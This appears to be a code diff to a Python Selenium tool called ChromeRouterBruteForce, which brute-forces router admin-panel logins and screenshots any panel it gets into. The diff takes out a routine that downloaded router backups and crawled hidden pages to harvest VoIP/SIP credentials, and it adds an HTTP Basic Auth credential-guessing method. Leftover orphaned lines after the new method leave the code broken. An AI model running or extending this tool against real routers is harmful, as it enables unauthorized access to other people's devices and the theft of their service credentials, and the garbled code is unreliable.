@@ -656,49 +656,48 @@ class ChromeRouterBruteForce:
             print(f"{Colors.RED}[!] Failed to take screenshot: {e}{Colors.END}")
             return None
     
-    def find_voip_sip_pages(self, base_url):
-        """Find and navigate to VoIP/SIP configuration pages"""
+    # VoIP/SIP search functionality removed as requested
+    
+    def test_http_basic_auth(self, username, password, login_url):
+        """Test HTTP Basic Authentication"""
         try:
-            print(f"{Colors.CYAN}[*] Searching for VoIP/SIP configuration pages...{Colors.END}")
+            if not hasattr(self, 'driver') or not self.driver:
+                return False, "Driver not initialized"
+                
+            parsed_url = urlparse(login_url)
+            auth_url = f"{parsed_url.scheme}://{username}:{password}@{parsed_url.netloc}{parsed_url.path}"
             
-            screenshots_taken = []
+            print(f"{Colors.BLUE}[*] Testing HTTP Basic Auth: {username}:{password}{Colors.END}")
+            self.driver.get(auth_url)
+            time.sleep(5)  # Wait longer for page to load completely
             
-            # Method 1: Extract all links from admin panel and filter VoIP/SIP ones
-            print(f"{Colors.BLUE}[*] Extracting all links from admin panel...{Colors.END}")
+            # Check current URL and page content
+            current_url = self.driver.current_url
+            page_source = self.driver.page_source.lower()
             
-            try:
-                # Get all links on the current admin panel page - try multiple methods
-                links = []
+            print(f"{Colors.BLUE}[*] After Basic Auth - URL: {current_url}{Colors.END}")
+            print(f"{Colors.BLUE}[*] Page title: {self.driver.title}{Colors.END}")
+            
+            # Check if admin panel is loaded
+            is_admin, admin_details = self.is_admin_panel_loaded()
+            
+            if is_admin:
+                # Take screenshot of admin panel
+                screenshot_file = self.take_screenshot(login_url)
+                if screenshot_file:
+                    print(f"{Colors.GREEN}[+] Screenshot saved: {screenshot_file}{Colors.END}")
                 
-                # Method 1: Standard links
-                try:
-                    links.extend(self.driver.find_elements(By.TAG_NAME, "a"))
-                except:
-                    pass
+                # Add to vulnerable findings
+                self.add_vulnerable_finding(login_url, username, password, admin_details)
                 
-                # Method 2: Clickable elements
-                try:
-                    clickable_elements = self.driver.find_elements(By.CSS_SELECTOR, "[onclick], [href], button, input[type='button'], input[type='submit']")
-                    links.extend(clickable_elements)
-                except:
-                    pass
+                print(f"{Colors.GREEN}🔒 VULNERABLE: {username}:{password} works!{Colors.END}")
+                return True, f"Successfully logged in with {username}:{password}"
+            else:
+                print(f"{Colors.RED}[!] Basic Auth worked but not admin panel: {admin_details}{Colors.END}")
+                return False, admin_details
                 
-                # Method 3: All elements with href
-                try:
-                    href_elements = self.driver.find_elements(By.CSS_SELECTOR, "[href]")
-                    links.extend(href_elements)
-                except:
-                    pass
-                
-                # Method 4: All clickable divs/spans (common in router interfaces)
-                try:
-                    clickable_divs = self.driver.find_elements(By.CSS_SELECTOR, "div[onclick], span[onclick], td[onclick], li[onclick]")
-                    links.extend(clickable_divs)
-                except:
-                    pass
-                
-                # Remove duplicates
-                unique_links = []
+        except Exception as e:
+            return False, f"HTTP Basic Auth error: {e}"
                 seen_hrefs = set()
                 for link in links:
                     try:
@@ -2043,109 +2042,7 @@ class ChromeRouterBruteForce:
             print(f"{Colors.RED}[!] Error saving configurations: {e}{Colors.END}")
             return None
     
-    def search_voip_after_success(self, login_url, username, password):
-        """Search for VoIP/SIP pages after successful login using RouterPassView approach"""
-        try:
-            print(f"{Colors.CYAN}[*] Searching for VoIP/SIP configuration pages after successful login...{Colors.END}")
-            
-            # Extract base URL for VoIP search
-            from urllib.parse import urlparse
-            parsed_url = urlparse(login_url)
-            base_url = f"{parsed_url.scheme}://{parsed_url.netloc}"
-            
-            print(f"{Colors.BLUE}[*] Starting RouterPassView approach for VoIP/SIP extraction...{Colors.END}")
-            
-            screenshots_taken = []
-            voip_configs = []
-            
-            # Phase 1: Try to download backup file
-            print(f"{Colors.BLUE}[*] Phase 1: Attempting to download router backup file...{Colors.END}")
-            backup_file = self.download_backup_file(base_url)
-            
-            if backup_file:
-                # Phase 2: Analyze backup file
-                print(f"{Colors.BLUE}[*] Phase 2: Analyzing backup file for VoIP/SIP configurations...{Colors.END}")
-                voip_configs = self.analyze_backup_file(backup_file)
-                
-                if voip_configs:
-                    # Phase 3: Save configurations to file
-                    print(f"{Colors.BLUE}[*] Phase 3: Saving VoIP/SIP configurations to file...{Colors.END}")
-                    config_file = self.save_voip_configs_to_file(voip_configs, login_url, username, password)
-                    if config_file:
-                        screenshots_taken.append(config_file)
-            else:
-                print(f"{Colors.YELLOW}[!] No backup file found, falling back to comprehensive search...{Colors.END}")
-                
-                # Fallback to comprehensive search methods with rate limiting
-                print(f"{Colors.BLUE}[*] Fallback: Starting comprehensive VoIP/SIP search (rate-limited)...{Colors.END}")
-                
-                # Method 1: Extract hidden links from HTML source (no requests)
-                print(f"{Colors.BLUE}[*] Method 1: Extracting hidden links from HTML source...{Colors.END}")
-                hidden_links = self.extract_hidden_links_from_html()
-                
-                # Method 2: Execute JavaScript to find dynamic links (no requests)
-                print(f"{Colors.BLUE}[*] Method 2: Executing JavaScript for dynamic links...{Colors.END}")
-                dynamic_links = self.execute_javascript_for_links()
-                
-                # Method 3: Scan common directories (rate-limited)
-                print(f"{Colors.BLUE}[*] Method 3: Scanning common directory patterns (rate-limited)...{Colors.END}")
-                found_directories = self.scan_common_directories(base_url)
-                
-                # Method 4: Scan CGI scripts (rate-limited)
-                print(f"{Colors.BLUE}[*] Method 4: Scanning CGI scripts (rate-limited)...{Colors.END}")
-                found_cgi = self.scan_cgi_scripts(base_url)
-                
-                # Method 5: Scan advanced firmware paths
-                print(f"{Colors.BLUE}[*] Method 5: Scanning advanced firmware paths...{Colors.END}")
-                found_paths = self.scan_advanced_paths(base_url)
-                
-                # Combine all found links
-                all_links = hidden_links + dynamic_links + found_directories + found_cgi + found_paths
-                
-                # Remove duplicates
-                unique_links = list(set(all_links))
-                
-                print(f"{Colors.GREEN}[+] Total unique links found: {len(unique_links)}{Colors.END}")
-                
-                # Test each unique link
-                for i, link in enumerate(unique_links):
-                    try:
-                        print(f"{Colors.BLUE}[*] Testing link {i+1}/{len(unique_links)}: {link}{Colors.END}")
-                        
-                        # Navigate to link
-                        if link.startswith('http'):
-                            self.driver.get(link)
-                        elif link.startswith('/'):
-                            self.driver.get(f"{base_url.rstrip('/')}{link}")
-                        else:
-                            continue
-                        
-                        time.sleep(2)
-                        
-                        # Check for VoIP/SIP content
-                        if self.is_voip_sip_page():
-                            screenshot_path = self.take_screenshot(login_url, f"voip_sip_{i+1}")
-                            screenshots_taken.append(screenshot_path)
-                            print(f"{Colors.GREEN}[+] VoIP/SIP page found: {link}{Colors.END}")
-                        
-                        # Go back to admin panel
-                        self.driver.back()
-                        time.sleep(1)
-                        
-                    except Exception as e:
-                        print(f"{Colors.RED}[!] Error testing link {link}: {e}{Colors.END}")
-                        continue
-            
-            if screenshots_taken:
-                print(f"{Colors.GREEN}[+] Found {len(screenshots_taken)} VoIP/SIP resources!{Colors.END}")
-                return screenshots_taken
-            else:
-                print(f"{Colors.RED}[!] No VoIP/SIP configurations found{Colors.END}")
-                return []
-            
-        except Exception as e:
-            print(f"{Colors.RED}[!] Error in RouterPassView approach: {e}{Colors.END}")
-            return []
+    # VoIP/SIP search functionality removed as requested
     
     def is_voip_sip_page(self):
         """Check if current page contains VoIP/SIP content"""
@@ -2544,23 +2441,15 @@ class ChromeRouterBruteForce:
                     time.sleep(3)
                     screenshot_path = self.take_screenshot(f"success_admin_panel_{username}_{password}", login_url)
                     
-                    # Search for VoIP/SIP pages after successful login
-                    voip_screenshots = self.search_voip_after_success(login_url, username, password)
+                    # Admin panel screenshot taken successfully
                     
                     return True, screenshot_path
                 else:
                     print(f"{Colors.YELLOW}[!] Basic Auth worked but not admin panel: {reason}{Colors.END}")
                     
-                    # Force VoIP search even if admin panel detection failed
-                    print(f"{Colors.BLUE}[*] Attempting VoIP/SIP search anyway...{Colors.END}")
-                    voip_screenshots = self.search_voip_after_success(login_url, username, password)
+                    # Admin panel detection failed, no further action needed
                     
-                    if voip_screenshots:
-                        print(f"{Colors.GREEN}[+] Found VoIP/SIP pages despite admin panel detection failure!{Colors.END}")
-                        screenshot_path = self.take_screenshot(f"success_admin_panel_{username}_{password}", login_url)
-                        return True, screenshot_path
-                    else:
-                        return False, f"HTTP Basic Auth worked but not admin panel: {reason}"
+                    return False, reason
             else:
                 print(f"{Colors.YELLOW}[!] Basic Auth failed - still on error page{Colors.END}")
                 return False, "HTTP Basic Auth failed - error page"
@@ -2766,8 +2655,7 @@ class ChromeRouterBruteForce:
                     print(f"{Colors.GREEN}[+] JavaScript-based Auth successful! {username}:{password}{Colors.END}")
                     screenshot_path = self.take_screenshot(f"success_admin_panel_{username}_{password}", login_url)
                     
-                    # Search for VoIP/SIP pages after successful login
-                    voip_screenshots = self.search_voip_after_success(login_url, username, password)
+                    # Admin panel screenshot taken successfully
                     
                     return True, screenshot_path
                 
@@ -2898,8 +2786,7 @@ class ChromeRouterBruteForce:
                     print(f"{Colors.GREEN}[+] Redirect-based Auth successful! {username}:{password}{Colors.END}")
                     screenshot_path = self.take_screenshot(f"success_admin_panel_{username}_{password}", login_url)
                     
-                    # Search for VoIP/SIP pages after successful login
-                    voip_screenshots = self.search_voip_after_success(login_url, username, password)
+                    # Admin panel screenshot taken successfully
                     
                     return True, screenshot_path
             
@@ -2993,8 +2880,7 @@ class ChromeRouterBruteForce:
                     print(f"{Colors.GREEN}[+] Form-based Auth successful after wait! {username}:{password}{Colors.END}")
                     screenshot_path = self.take_screenshot(f"success_admin_panel_{username}_{password}", login_url)
                     
-                    # Search for VoIP/SIP pages after successful login
-                    voip_screenshots = self.search_voip_after_success(login_url, username, password)
+                    # Admin panel screenshot taken successfully
                     
                     return True, screenshot_path
             
@@ -3024,8 +2910,7 @@ class ChromeRouterBruteForce:
                     print(f"{Colors.GREEN}[+] Form-based Auth successful (admin content detected)! {username}:{password}{Colors.END}")
                     screenshot_path = self.take_screenshot(f"success_admin_panel_{username}_{password}", login_url)
                     
-                    # Search for VoIP/SIP pages after successful login
-                    voip_screenshots = self.search_voip_after_success(login_url, username, password)
+                    # Admin panel screenshot taken successfully
                     
                     return True, screenshot_path
             except:
